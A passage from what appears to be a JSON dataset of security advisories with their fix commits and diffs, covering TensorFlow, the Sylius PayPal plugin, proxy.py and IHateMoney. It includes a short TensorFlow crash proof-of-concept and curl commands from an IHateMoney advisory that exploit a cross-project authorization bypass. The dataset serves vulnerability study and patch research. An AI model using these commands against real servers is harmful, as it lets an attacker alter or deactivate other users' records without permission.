set_delete_on_deallocate() { delete_on_deallocate_ = true; }\n \n+  \/\/ Make sure tensors or complex types (strings, variants, resources) don't get\n+  \/\/ their constructor called via a placement new since that would require\n+  \/\/ writing to immutable data.\n+  \/\/ See also: tensorflow\/core\/framework\/typed_allocator.h\n+  bool AllocatesOpaqueHandle() const override { return true; }\n+\n  private:\n   std::unique_ptr<ReadOnlyMemoryRegion> memory_region_;\n   \/\/ If there is an error during allocation we keep it in this status.",
            "code_diff":"@@ -62,6 +62,12 @@ class MemmappedTensorAllocator : public Allocator {\n \n   void set_delete_on_deallocate() { delete_on_deallocate_ = true; }\n \n+  \/\/ Make sure tensors or complex types (strings, variants, resources) don't get\n+  \/\/ their constructor called via a placement new since that would require\n+  \/\/ writing to immutable data.\n+  \/\/ See also: tensorflow\/core\/framework\/typed_allocator.h\n+  bool AllocatesOpaqueHandle() const override { return true; }\n+\n  private:\n   std::unique_ptr<ReadOnlyMemoryRegion> memory_region_;\n   \/\/ If there is an error during allocation we keep it in this status."
        },
        {
            "index":864,
            "vuln_id":"GHSA-r4pj-74mg-8868",
            "cwe_id":"{'CWE-369'}",
            "score":2.5,
            "chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/fca9874a9b42a2134f907d2fb46ab774a831404a'}",
            "dataset":"osv",
            "summary":"Division by 0 in `Conv2DBackpropFilter` ### Impact\nAn attacker can trigger a division by 0 in `tf.raw_ops.Conv2DBackpropFilter`:\n\n```python\nimport tensorflow as tf\n\ninput_tensor = tf.constant([], shape=[0, 0, 1, 0], dtype=tf.float32)\nfilter_sizes = tf.constant([1, 1, 1, 1], shape=[4], dtype=tf.int32)\nout_backprop = tf.constant([], shape=[0, 0, 1, 1], dtype=tf.float32)\n\ntf.raw_ops.Conv2DBackpropFilter(input=input_tensor, filter_sizes=filter_sizes,\n                                out_backprop=out_backprop,\n                                strides=[1, 66, 18, 1], use_cudnn_on_gpu=True,\n                                padding='SAME', explicit_paddings=[],\n                                data_format='NHWC', dilations=[1, 1, 1, 1])\n```                 \n                    \nThis is because the [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/496c2630e51c1a478f095b084329acedb253db6b\/tensorflow\/core\/kernels\/conv_grad_shape_utils.cc#L130) does a modulus operation where the divisor is controlled by the caller:\n\n```cc \n  if (dims->in_depth % filter_shape.dim_size(num_dims - 2)) { ... }\n```\n    \n### Patches\nWe have patched the issue in GitHub commit [fca9874a9b42a2134f907d2fb46ab774a831404a](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/fca9874a9b42a2134f907d2fb46ab774a831404a).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n  \n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
            "published_date":"2021-05-21",
            "chain_len":1,
            "project":"https:\/\/github.com\/tensorflow\/tensorflow",
            "commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/fca9874a9b42a2134f907d2fb46ab774a831404a",
            "commit_sha":"fca9874a9b42a2134f907d2fb46ab774a831404a",
            "patch":"SINGLE",
            "chain_ord":"['fca9874a9b42a2134f907d2fb46ab774a831404a']",
            "before_first_fix_commit":"{'496c2630e51c1a478f095b084329acedb253db6b'}",
            "last_fix_commit":"fca9874a9b42a2134f907d2fb46ab774a831404a",
            "chain_ord_pos":1.0,
            "commit_datetime":"04\/20\/2021, 00:33:11",
            "message":"Prevent another division by zero.\n\nPiperOrigin-RevId: 369338598\nChange-Id: I55471d363e401fdcf8d259670ad4eef672b731e2",
            "author":"Mihai Maruseac",
            "comments":null,
            "stats":"{'additions': 4, 'deletions': 0, 'total': 4}",
            "files":"{'tensorflow\/core\/kernels\/conv_grad_shape_utils.cc': {'additions': 4, 'deletions': 0, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/fca9874a9b42a2134f907d2fb46ab774a831404a\/tensorflow%2Fcore%2Fkernels%2Fconv_grad_shape_utils.cc', 'patch': '@@ -127,6 +127,10 @@ Status ConvBackpropComputeDimensionsV2(\\n   \/\/ dimensions of the filter Tensor.\\n   VLOG(2) << \"input vs filter_in depth \" << dims->in_depth << \" \"\\n           << filter_shape.dim_size(num_dims - 2);\\n+  if (filter_shape.dim_size(num_dims - 2) <= 0) {\\n+    return errors ::InvalidArgument(\\n+        label, \": filter depth must be strictly greated than zero\");\\n+  }\\n   if (dims->in_depth % filter_shape.dim_size(num_dims - 2)) {\\n     return errors::InvalidArgument(\\n         label, \": input depth must be evenly divisible by filter depth\");'}}",
            "message_norm":"prevent another division by zero.\n\npiperorigin-revid: 369338598\nchange-id: i55471d363e401fdcf8d259670ad4eef672b731e2",
            "language":"en",
            "entities":"[('prevent', 'ACTION', ''), ('division by zero', 'SECWORD', ''), ('369338598', 'SHA', 'generic_sha')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['tensorflow\/core\/kernels\/conv_grad_shape_utils.cc'])",
            "num_files":1.0,
            "patch_content":"From fca9874a9b42a2134f907d2fb46ab774a831404a Mon Sep 17 00:00:00 2001\nFrom: Mihai Maruseac <mihaimaruseac@google.com>\nDate: Mon, 19 Apr 2021 17:33:11 -0700\nSubject: [PATCH] Prevent another division by zero.\n\nPiperOrigin-RevId: 369338598\nChange-Id: I55471d363e401fdcf8d259670ad4eef672b731e2\n---\n tensorflow\/core\/kernels\/conv_grad_shape_utils.cc | 4 ++++\n 1 file changed, 4 insertions(+)\n\ndiff --git a\/tensorflow\/core\/kernels\/conv_grad_shape_utils.cc b\/tensorflow\/core\/kernels\/conv_grad_shape_utils.cc\nindex 7543ce669923ac..805f5809a472e9 100644\n--- a\/tensorflow\/core\/kernels\/conv_grad_shape_utils.cc\n+++ b\/tensorflow\/core\/kernels\/conv_grad_shape_utils.cc\n@@ -127,6 +127,10 @@ Status ConvBackpropComputeDimensionsV2(\n   \/\/ dimensions of the filter Tensor.\n   VLOG(2) << \"input vs filter_in depth \" << dims->in_depth << \" \"\n           << filter_shape.dim_size(num_dims - 2);\n+  if (filter_shape.dim_size(num_dims - 2) <= 0) {\n+    return errors ::InvalidArgument(\n+        label, \": filter depth must be strictly greated than zero\");\n+  }\n   if (dims->in_depth % filter_shape.dim_size(num_dims - 2)) {\n     return errors::InvalidArgument(\n         label, \": input depth must be evenly divisible by filter depth\");",
            "code_diff":"@@ -127,6 +127,10 @@ Status ConvBackpropComputeDimensionsV2(\n   \/\/ dimensions of the filter Tensor.\n   VLOG(2) << \"input vs filter_in depth \" << dims->in_depth << \" \"\n           << filter_shape.dim_size(num_dims - 2);\n+  if (filter_shape.dim_size(num_dims - 2) <= 0) {\n+    return errors ::InvalidArgument(\n+        label, \": filter depth must be strictly greated than zero\");\n+  }\n   if (dims->in_depth % filter_shape.dim_size(num_dims - 2)) {\n     return errors::InvalidArgument(\n         label, \": input depth must be evenly divisible by filter depth\");"
        },
        {
            "index":322,
            "vuln_id":"GHSA-25fx-mxc2-76g7",
            "cwe_id":"{'CWE-200'}",
            "score":7.5,
            "chain":"{'https:\/\/github.com\/Sylius\/PayPalPlugin\/commit\/814923c2e9d97fe6279dcee866c34ced3d2fb7a7', 'https:\/\/github.com\/Sylius\/PayPalPlugin\/commit\/2adc46be2764ccee22b4247139b8056fb8d1afff'}",
            "dataset":"osv",
            "summary":"Unauthorized access to Credit card form exposing payer name and not requiring 3DS ### Impact\nURL to the payment page done after checkout was created with autoincremented payment id (`\/pay-with-paypal\/{id}`) and therefore it was easy to access for anyone, not even the order's customer. The problem was, the Credit card form has prefilled \"credit card holder\" field with the Customer's first and last name.\nAdditionally, the mentioned form did not require a 3D Secure authentication, as well as did not checked the result of the 3D Secure authentication.\n\n### Patches\nThe problem has been patched in Sylius\/PayPalPlugin **1.2.4** and **1.3.1**\n\n### Workarounds\nOne can override a `sylius_paypal_plugin_pay_with_paypal_form` route and change its URL parameters to (for example) `{orderToken}\/{paymentId}`, then override the `Sylius\\PayPalPlugin\\Controller\\PayWithPayPalFormAction` service, to operate on the payment taken from the repository by these 2 values. It would also require usage of custom repository method.\nAdditionally, one could override the `@SyliusPayPalPlugin\/payWithPaypal.html.twig` template, to add `contingencies: ['SCA_ALWAYS']` line in `hostedFields.submit(...)` function call (line 421). It would then have to be handled in the function callback.\n\n### For more information\nIf you have any questions or comments about this advisory:\n- Open an issue in Sylius\/PayPalPlugin issues\n- Email us at security at sylius dot com",
            "published_date":"2021-10-06",
            "chain_len":2,
            "project":"https:\/\/github.com\/Sylius\/PayPalPlugin",
            "commit_href":"https:\/\/github.com\/Sylius\/PayPalPlugin\/commit\/2adc46be2764ccee22b4247139b8056fb8d1afff",
            "commit_sha":"2adc46be2764ccee22b4247139b8056fb8d1afff",
            "patch":"MULTI",
            "chain_ord":"['2adc46be2764ccee22b4247139b8056fb8d1afff', '814923c2e9d97fe6279dcee866c34ced3d2fb7a7']",
            "before_first_fix_commit":"{'2adc46be2764ccee22b4247139b8056fb8d1afff', 'a375013be7a740bef132927d74a1e03fd78a60ef'}",
            "last_fix_commit":"814923c2e9d97fe6279dcee866c34ced3d2fb7a7",
            "chain_ord_pos":1.0,
            "commit_datetime":"10\/04\/2021, 13:57:45",
            "message":"Require 3D Secure and process its response correctly",
            "author":"Mateusz Zalewski",
            "comments":"{'com_1': {'author': 'Maseeullahz', 'datetime': '01\/29\/2022, 00:49:58', 'body': 'IKSDKN'}}",
            "stats":"{'additions': 33, 'deletions': 13, 'total': 46}",
            "files":"{'src\/Resources\/views\/payWithPaypal.html.twig': {'additions': 33, 'deletions': 13, 'changes': 46, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/Sylius\/PayPalPlugin\/raw\/2adc46be2764ccee22b4247139b8056fb8d1afff\/src%2FResources%2Fviews%2FpayWithPaypal.html.twig', 'patch': \"@@ -329,6 +329,8 @@\\n         });\\n \\n         if (paypal.HostedFields.isEligible() === true) {\\n+            let processingOrderId;\\n+\\n             paypal.HostedFields.render({\\n                 createOrder: function(data, actions) {\\n                     document.querySelector('#paypal-payment-container').classList.add('loading');\\n@@ -339,6 +341,8 @@\\n                     }).then(function(res) {\\n                         return res.json();\\n                     }).then(function(data) {\\n+                        processingOrderId = data.orderID;\\n+\\n                         return data.orderID;\\n                     });\\n                 },\\n@@ -419,6 +423,7 @@\\n \\n                     if (formValid) {\\n                         hostedFields.submit({\\n+                            contingencies: ['SCA_ALWAYS'],\\n                             cardholderName: document.getElementById('card-holder-name').value,\\n                             billingAddress: {\\n                                 streetAddress: document.getElementById('card-billing-address-street').value,\\n@@ -428,20 +433,35 @@\\n                                 countryCodeAlpha2: document.getElementById('card-billing-address-country').value\\n                             }\\n                         }).then(payload => {\\n-                            return fetch(completePayPalOrderUrl, {\\n-                                method: 'post'\\n-                            }).then(function(res) {\\n-                                return res.json();\\n+                            if (payload.authenticationReason == 'SUCCESSFUL' && payload.authenticationStatus == 'YES') {\\n+                                return fetch(completePayPalOrderUrl, {\\n+                                    method: 'post'\\n+                                }).then(function(res) {\\n+                                    return res.json();\\n+                                }).then(function(data) {\\n+                                    if (data.status == 'processing') {\\n+                                        return fetch(cancelPayPalPaymentUrl, {\\n+                                            method: 'post',\\n+                                            headers: { 'content-type': 'application\/json' },\\n+                                            body: JSON.stringify({ payPalOrderId: data.orderID })\\n+                                        }).then(window.location.reload());\\n+                                    }\\n+\\n+                                    window.location.href = data.return_url;\\n+                                });\\n+                            }\\n+\\n+\\n+                            return fetch(errorPayPalPaymentUrl, {\\n+                                method: 'post',\\n+                                headers: { 'content-type': 'application\/json' },\\n+                                body: JSON.stringify('Invalid 3D Secure authentication.')\\n                             }).then(function(data) {\\n-                                if (data.status == 'processing') {\\n-                                    return fetch(cancelPayPalPaymentUrl, {\\n-                                        method: 'post',\\n-                                        headers: { 'content-type': 'application\/json' },\\n-                                        body: JSON.stringify({ payPalOrderId: data.orderID })\\n-                                    }).then(window.location.reload());\\n-                                }\\n-\\n-                                window.location.href = data.return_url;\\n+                                return fetch(cancelPayPalPaymentUrl, {\\n+                                    method: 'post',\\n+                                    headers: { 'content-type': 'application\/json' },\\n+                                    body: JSON.stringify({ payPalOrderId: processingOrderId })\\n+                                }).then(window.location.reload());\\n                             });\\n                         });\\n                     } else {\"}}",
            "message_norm":"require 3d secure and process its response correctly",
            "language":"en",
            "entities":"[('secure', 'SECWORD', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['src\/Resources\/views\/payWithPaypal.html.twig'])",
            "num_files":1.0,
            "patch_content":"From 2adc46be2764ccee22b4247139b8056fb8d1afff Mon Sep 17 00:00:00 2001\nFrom: Mateusz Zalewski <zaleslaw@gmail.com>\nDate: Mon, 4 Oct 2021 15:57:45 +0200\nSubject: [PATCH] Require 3D Secure and process its response correctly\n\n---\n src\/Resources\/views\/payWithPaypal.html.twig | 46 +++++++++++++++------\n 1 file changed, 33 insertions(+), 13 deletions(-)\n\ndiff --git a\/src\/Resources\/views\/payWithPaypal.html.twig b\/src\/Resources\/views\/payWithPaypal.html.twig\nindex ef09d17a..e164e4d1 100644\n--- a\/src\/Resources\/views\/payWithPaypal.html.twig\n+++ b\/src\/Resources\/views\/payWithPaypal.html.twig\n@@ -329,6 +329,8 @@\n         });\n \n         if (paypal.HostedFields.isEligible() === true) {\n+            let processingOrderId;\n+\n             paypal.HostedFields.render({\n                 createOrder: function(data, actions) {\n                     document.querySelector('#paypal-payment-container').classList.add('loading');\n@@ -339,6 +341,8 @@\n                     }).then(function(res) {\n                         return res.json();\n                     }).then(function(data) {\n+                        processingOrderId = data.orderID;\n+\n                         return data.orderID;\n                     });\n                 },\n@@ -419,6 +423,7 @@\n \n                     if (formValid) {\n                         hostedFields.submit({\n+                            contingencies: ['SCA_ALWAYS'],\n                             cardholderName: document.getElementById('card-holder-name').value,\n                             billingAddress: {\n                                 streetAddress: document.getElementById('card-billing-address-street').value,\n@@ -428,20 +433,35 @@\n                                 countryCodeAlpha2: document.getElementById('card-billing-address-country').value\n                             }\n                         }).then(payload => {\n-                            return fetch(completePayPalOrderUrl, {\n-                                method: 'post'\n-                            }).then(function(res) {\n-                                return res.json();\n+                            if (payload.authenticationReason == 'SUCCESSFUL' && payload.authenticationStatus == 'YES') {\n+                                return fetch(completePayPalOrderUrl, {\n+                                    method: 'post'\n+                                }).then(function(res) {\n+                                    return res.json();\n+                                }).then(function(data) {\n+                                    if (data.status == 'processing') {\n+                                        return fetch(cancelPayPalPaymentUrl, {\n+                                            method: 'post',\n+                                            headers: { 'content-type': 'application\/json' },\n+                                            body: JSON.stringify({ payPalOrderId: data.orderID })\n+                                        }).then(window.location.reload());\n+                                    }\n+\n+                                    window.location.href = data.return_url;\n+                                });\n+                            }\n+\n+\n+                            return fetch(errorPayPalPaymentUrl, {\n+                                method: 'post',\n+                                headers: { 'content-type': 'application\/json' },\n+                                body: JSON.stringify('Invalid 3D Secure authentication.')\n                             }).then(function(data) {\n-                                if (data.status == 'processing') {\n-                                    return fetch(cancelPayPalPaymentUrl, {\n-                                        method: 'post',\n-                                        headers: { 'content-type': 'application\/json' },\n-                                        body: JSON.stringify({ payPalOrderId: data.orderID })\n-                                    }).then(window.location.reload());\n-                                }\n-\n-                                window.location.href = data.return_url;\n+                                return fetch(cancelPayPalPaymentUrl, {\n+                                    method: 'post',\n+                                    headers: { 'content-type': 'application\/json' },\n+                                    body: JSON.stringify({ payPalOrderId: processingOrderId })\n+                                }).then(window.location.reload());\n                             });\n                         });\n                     } else {",
            "code_diff":"@@ -329,6 +329,8 @@\n         });\n \n         if (paypal.HostedFields.isEligible() === true) {\n+            let processingOrderId;\n+\n             paypal.HostedFields.render({\n                 createOrder: function(data, actions) {\n                     document.querySelector('#paypal-payment-container').classList.add('loading');\n@@ -339,6 +341,8 @@\n                     }).then(function(res) {\n                         return res.json();\n                     }).then(function(data) {\n+                        processingOrderId = data.orderID;\n+\n                         return data.orderID;\n                     });\n                 },\n@@ -419,6 +423,7 @@\n \n                     if (formValid) {\n                         hostedFields.submit({\n+                            contingencies: ['SCA_ALWAYS'],\n                             cardholderName: document.getElementById('card-holder-name').value,\n                             billingAddress: {\n                                 streetAddress: document.getElementById('card-billing-address-street').value,\n@@ -428,20 +433,35 @@\n                                 countryCodeAlpha2: document.getElementById('card-billing-address-country').value\n                             }\n                         }).then(payload => {\n-                            return fetch(completePayPalOrderUrl, {\n-                                method: 'post'\n-                            }).then(function(res) {\n-                                return res.json();\n+                            if (payload.authenticationReason == 'SUCCESSFUL' && payload.authenticationStatus == 'YES') {\n+                                return fetch(completePayPalOrderUrl, {\n+                                    method: 'post'\n+                                }).then(function(res) {\n+                                    return res.json();\n+                                }).then(function(data) {\n+                                    if (data.status == 'processing') {\n+                                        return fetch(cancelPayPalPaymentUrl, {\n+                                            method: 'post',\n+                                            headers: { 'content-type': 'application\/json' },\n+                                            body: JSON.stringify({ payPalOrderId: data.orderID })\n+                                        }).then(window.location.reload());\n+                                    }\n+\n+                                    window.location.href = data.return_url;\n+                                });\n+                            }\n+\n+\n+                            return fetch(errorPayPalPaymentUrl, {\n+                                method: 'post',\n+                                headers: { 'content-type': 'application\/json' },\n+                                body: JSON.stringify('Invalid 3D Secure authentication.')\n                             }).then(function(data) {\n-                                if (data.status == 'processing') {\n-                                    return fetch(cancelPayPalPaymentUrl, {\n-                                        method: 'post',\n-                                        headers: { 'content-type': 'application\/json' },\n-                                        body: JSON.stringify({ payPalOrderId: data.orderID })\n-                                    }).then(window.location.reload());\n-                                }\n-\n-                                window.location.href = data.return_url;\n+                                return fetch(cancelPayPalPaymentUrl, {\n+                                    method: 'post',\n+                                    headers: { 'content-type': 'application\/json' },\n+                                    body: JSON.stringify({ payPalOrderId: processingOrderId })\n+                                }).then(window.location.reload());\n                             });\n                         });\n                     } else {"
        },
        {
            "index":256,
            "vuln_id":"GHSA-cmc7-mfmr-xqrx",
            "cwe_id":"{'CWE-480', 'CWE-287'}",
            "score":7.5,
            "chain":"{'https:\/\/github.com\/abhinavsingh\/proxy.py\/pull\/482\/commits\/9b00093288237f5073c403f2c4f62acfdfa8ed46'}",
            "dataset":"osv",
            "summary":"Logic error in authentication in proxy.py before_upstream_connection in AuthPlugin in http\/proxy\/auth.py in proxy.py before 2.3.1 accepts incorrect Proxy-Authorization header data because of a boolean confusion (and versus or).",
            "published_date":"2021-04-07",
            "chain_len":1,
            "project":"https:\/\/github.com\/abhinavsingh\/proxy.py",
            "commit_href":"https:\/\/github.com\/abhinavsingh\/proxy.py\/pull\/482\/commits\/9b00093288237f5073c403f2c4f62acfdfa8ed46",
            "commit_sha":"9b00093288237f5073c403f2c4f62acfdfa8ed46",
            "patch":"SINGLE",
            "chain_ord":"['9b00093288237f5073c403f2c4f62acfdfa8ed46']",
            "before_first_fix_commit":"{'0f78e74705e295bbfccfba342bf9fd34a9aa9103'}",
            "last_fix_commit":"9b00093288237f5073c403f2c4f62acfdfa8ed46",
            "chain_ord_pos":1.0,
            "commit_datetime":"01\/10\/2021, 16:30:14",
            "message":"Fix basic auth condition",
            "author":"Abhinav Singh",
            "comments":null,
            "stats":"{'additions': 2, 'deletions': 2, 'total': 4}",
            "files":"{'proxy\/http\/proxy\/auth.py': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/abhinavsingh\/proxy.py\/raw\/9b00093288237f5073c403f2c4f62acfdfa8ed46\/proxy%2Fhttp%2Fproxy%2Fauth.py', 'patch': \"@@ -35,8 +35,8 @@ def before_upstream_connection(\\n                 raise ProxyAuthenticationFailed()\\n             parts = request.headers[b'proxy-authorization'][1].split()\\n             if len(parts) != 2 \\\\\\n-                    and parts[0].lower() != b'basic' \\\\\\n-                    and parts[1] != self.flags.auth_code:\\n+                    or parts[0].lower() != b'basic' \\\\\\n+                    or parts[1] != self.flags.auth_code:\\n                 raise ProxyAuthenticationFailed()\\n         return request\"}}",
            "message_norm":"fix basic auth condition",
            "language":"en",
            "entities":"[('fix', 'ACTION', ''), ('auth', 'SECWORD', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['proxy\/http\/proxy\/auth.py'])",
            "num_files":1.0,
            "patch_content":"From 9b00093288237f5073c403f2c4f62acfdfa8ed46 Mon Sep 17 00:00:00 2001\nFrom: Abhinav Singh <mailsforabhinav@gmail.com>\nDate: Sun, 10 Jan 2021 22:00:14 +0530\nSubject: [PATCH] Fix basic auth condition\n\n---\n proxy\/http\/proxy\/auth.py | 4 ++--\n 1 file changed, 2 insertions(+), 2 deletions(-)\n\ndiff --git a\/proxy\/http\/proxy\/auth.py b\/proxy\/http\/proxy\/auth.py\nindex 263ec9bd05..d1ac9a8611 100644\n--- a\/proxy\/http\/proxy\/auth.py\n+++ b\/proxy\/http\/proxy\/auth.py\n@@ -35,8 +35,8 @@ def before_upstream_connection(\n                 raise ProxyAuthenticationFailed()\n             parts = request.headers[b'proxy-authorization'][1].split()\n             if len(parts) != 2 \\\n-                    and parts[0].lower() != b'basic' \\\n-                    and parts[1] != self.flags.auth_code:\n+                    or parts[0].lower() != b'basic' \\\n+                    or parts[1] != self.flags.auth_code:\n                 raise ProxyAuthenticationFailed()\n         return request",
            "code_diff":"@@ -35,8 +35,8 @@ def before_upstream_connection(\n                 raise ProxyAuthenticationFailed()\n             parts = request.headers[b'proxy-authorization'][1].split()\n             if len(parts) != 2 \\\n-                    and parts[0].lower() != b'basic' \\\n-                    and parts[1] != self.flags.auth_code:\n+                    or parts[0].lower() != b'basic' \\\n+                    or parts[1] != self.flags.auth_code:\n                 raise ProxyAuthenticationFailed()\n         return request"
        },
        {
            "index":459,
            "vuln_id":"GHSA-67j9-c52g-w2q9",
            "cwe_id":"{'CWE-863'}",
            "score":4.9,
            "chain":"{'https:\/\/github.com\/spiral-project\/ihatemoney\/commit\/8d77cf5d5646e1d2d8ded13f0660638f57e98471'}",
            "dataset":"osv",
            "summary":"Authorization Bypass in I hate money ### Impact\nAn authenticated member of one project can modify and delete members of another project, without knowledge of this other project's private code. This can be further exploited to access all bills of another project without knowledge of this other project's private code.\n\nWith the default configuration, anybody is allowed to create a new project. An attacker can create a new project and then use it to become authenticated and exploit this flaw. As such, the exposure is similar to an unauthenticated attack, because it is trivial to become authenticated.\n\n### Patches\n```diff\n ihatemoney\/models.py | 4 ++--\n 1 file changed, 2 insertions(+), 2 deletions(-)\n\ndiff --git a\/ihatemoney\/models.py b\/ihatemoney\/models.py\nindex fe7b519..5691c75 100644\n--- a\/ihatemoney\/models.py\n+++ b\/ihatemoney\/models.py\n@@ -380,7 +380,7 @@ class Person(db.Model):\n         def get_by_name(self, name, project):\n             return (\n                 Person.query.filter(Person.name == name)\n-                .filter(Project.id == project.id)\n+                .filter(Person.project_id == project.id)\n                 .one()\n             )\n \n@@ -389,7 +389,7 @@ class Person(db.Model):\n                 project = g.project\n             return (\n                 Person.query.filter(Person.id == id)\n-                .filter(Project.id == project.id)\n+                .filter(Person.project_id == project.id)\n                 .one()\n             )\n \n```\n\n### Workarounds\n\nTo limit the impact, it is possible to disable public project creation by setting `ALLOW_PUBLIC_PROJECT_CREATION = False` in the configuration (see [documentation](https:\/\/ihatemoney.readthedocs.io\/en\/latest\/configuration.html)). Existing users will still be able to exploit the flaw, but this will prevent an external attacker from creating a new project.\n\n### For more information\n\n`Person.query.get()` and `Person.query.get_by_name()` were mistakenly running a database join on the Project table without constraining the result.\n\nAs a result, `Person.query.get(42, \"projectfoo\")` would return the Person with id=42, even if it is not associated to the project \"projectfoo\".  The only condition is that \"projectfoo\" must exist.\n\nThis flaw can be exploited in several places:\n\n1) API: PUT requests to `\/api\/projects\/<project>\/members\/<personID>` will succeed even though `<personID>` is not a member of `<project>`.\n\n   This allows an authenticated attacker to alter the state of a member (name, weight, activated) in any project.  In addition, the altered member will no longer be associated with its original project but will be associated to the attacker project instead, breaking many features of IHateMoney.  For instance, bills referencing the altered member will no longer be visible in the original project.\n\n   This causes an additional information disclosure and loss of integrity on bills: the attacker will now be able to see, edit and delete bills belonging to the altered member, because IHateMoney now believes that these bills are associated to the attacker project through the altered member.\n\n   For instance, assume that `Person(id=42)` is a member of project \"targetProject\", and that the attacker has access to another project \"attackerProject\" with the private code \"attackerPassword\".  The attacker can modify `Person(id=42)` with this command:\n\n     $ curl -X PUT -d \"name=Pwn3d&activated=1\" --basic -u attackerProject:attackerPassword http:\/\/$SERVER\/api\/projects\/attackerProject\/members\/42\n\n   The attacker can now see, edit and delete bills paid by `Person(id=42)` by simply browsing to http:\/\/$SERVER\/attackerProject\/\n\n2) Editing a member through the web interface at `\/<project>\/members\/<personID>\/edit` will succeed even though `<personID>` is not a member of `<project>`.\n\n   This is very similar to the PUT exploit.  Reusing the same example, the attacker needs to login to its \"attackerProject\" project with the private code \"attackerPassword\".  It can then alter the state of `Person(id=42)` by accessing the edit form at the following URL:\n\n     http:\/\/$SERVER\/attackerProject\/members\/42\/edit\n\n   Again, as a result of the alteration, the altered member will become associated to the project \"attackerProject\", resulting in the same information disclosure and loss of integrity on bills.\n\n3) API: DELETE requests to `\/api\/projects\/<project>\/members\/<personID>` will similarly allow to delete the member `<personID>` even if it belongs to a different project than `<project>`.\n\n     $ curl -X DELETE --basic -u attackerProject:attackerPassword http:\/\/$SERVER\/api\/projects\/attackerProject\/members\/42\n\n   The impact is less serious than with PUT, because DELETE only deactivates a member (it does not really delete it).\n\nAll these exploits require authentication: an attacker needs to know a valid project name and its associated \"private code\".  Once this requirement is fullfilled, the attacker can exploit this flaw to alter the state of members in any other project, without needing to know the target project name or its private code.\n\n`Person.query.get_by_name()` suffers from the same issue as `Person.query.get()`.  It has an additional issue: if multiple Person objects with the same name exist (this is possible if they are associated to different projects), `get_by_name()` will crash with `MultipleResultsFound` because of the call to `one()`.\n\nHowever, since `Person.query.get_by_name()` is currently not used anywhere in IHateMoney, the bug affecting this function has no impact and is not exploitable.",
            "published_date":"2020-07-27",
            "chain_len":1,
            "project":"https:\/\/github.com\/spiral-project\/ihatemoney",
            "commit_href":"https:\/\/github.com\/spiral-project\/ihatemoney\/commit\/8d77cf5d5646e1d2d8ded13f0660638f57e98471",
            "commit_sha":"8d77cf5d5646e1d2d8ded13f0660638f57e98471",
            "patch":"SINGLE",
            "chain_ord":"['8d77cf5d5646e1d2d8ded13f0660638f57e98471']",
            "before_first_fix_commit":"{'040d76af83411fb58ab400dc4eac909191a3e5fa'}",
            "last_fix_commit":"8d77cf5d5646e1d2d8ded13f0660638f57e98471",
            "chain_ord_pos":1.0,
            "commit_datetime":"07\/17\/2020, 15:43:33",
            "message":"Fix unauthorized access and modification of project data (CVE-2020-15120)\n\nAn authenticated member of one project can modify and delete members of\nanother project, without knowledge of this other project's private\ncode. This can be further exploited to access all bills of another project\nwithout knowledge of this other project's private code.\n\nWith the default configuration, anybody is allowed to create a new\nproject. An attacker can create a new project and then use it to become\nauthenticated and exploit this flaw. As such, the exposure is similar to\nan unauthenticated attack, because it is trivial to become authenticated.\n\nThis issue was caused by a wrong database queries in PersonQuery.\n\nFor more details, see https:\/\/github.com\/spiral-project\/ihatemoney\/security\/advisories\/GHSA-67j9-c52g-w2q9",
            "author":"Baptiste Jonglez",
            "comments":null,
            "stats":"{'additions': 2, 'deletions': 2, 'total': 4}",
            "files":"{'ihatemoney\/models.py': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/spiral-project\/ihatemoney\/raw\/8d77cf5d5646e1d2d8ded13f0660638f57e98471\/ihatemoney%2Fmodels.py', 'patch': '@@ -380,7 +380,7 @@ class PersonQuery(BaseQuery):\\n         def get_by_name(self, name, project):\\n             return (\\n                 Person.query.filter(Person.name == name)\\n-                .filter(Project.id == project.id)\\n+                .filter(Person.project_id == project.id)\\n                 .one()\\n             )\\n \\n@@ -389,7 +389,7 @@ def get(self, id, project=None):\\n                 project = g.project\\n             return (\\n                 Person.query.filter(Person.id == id)\\n-                .filter(Project.id == project.id)\\n+                .filter(Person.project_id == project.id)\\n                 .one()\\n             )'}}",
            "message_norm":"fix unauthorized access and modification of project data (cve-2020-15120)\n\nan authenticated member of one project can modify and delete members of\nanother project, without knowledge of this other project's private\ncode. this can be further exploited to access all bills of another project\nwithout knowledge of this other project's private code.\n\nwith the default configuration, anybody is allowed to create a new\nproject. an attacker can create a new project and then use it to become\nauthenticated and exploit this flaw. as such, the exposure is similar to\nan unauthenticated attack, because it is trivial to become authenticated.\n\nthis issue was caused by a wrong database queries in personquery.\n\nfor more details, see https:\/\/github.com\/spiral-project\/ihatemoney\/security\/advisories\/ghsa-67j9-c52g-w2q9",
            "language":"en",
            "entities":"[('fix', 'ACTION', ''), ('cve-2020-15120', 'VULNID', 'CVE'), ('exploited', 'SECWORD', ''), ('attacker', 'FLAW', ''), ('exploit', 'SECWORD', ''), ('flaw', 'FLAW', ''), ('unauthenticated', 'SECWORD', ''), ('attack', 'FLAW', ''), ('issue', 'FLAW', ''), ('https:\/\/github.com\/spiral-project\/ihatemoney\/security\/advisories\/ghsa-67j9-c52g-w2q9', 'URL', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['ihatemoney\/models.py'])",
            "num_files":1.0,
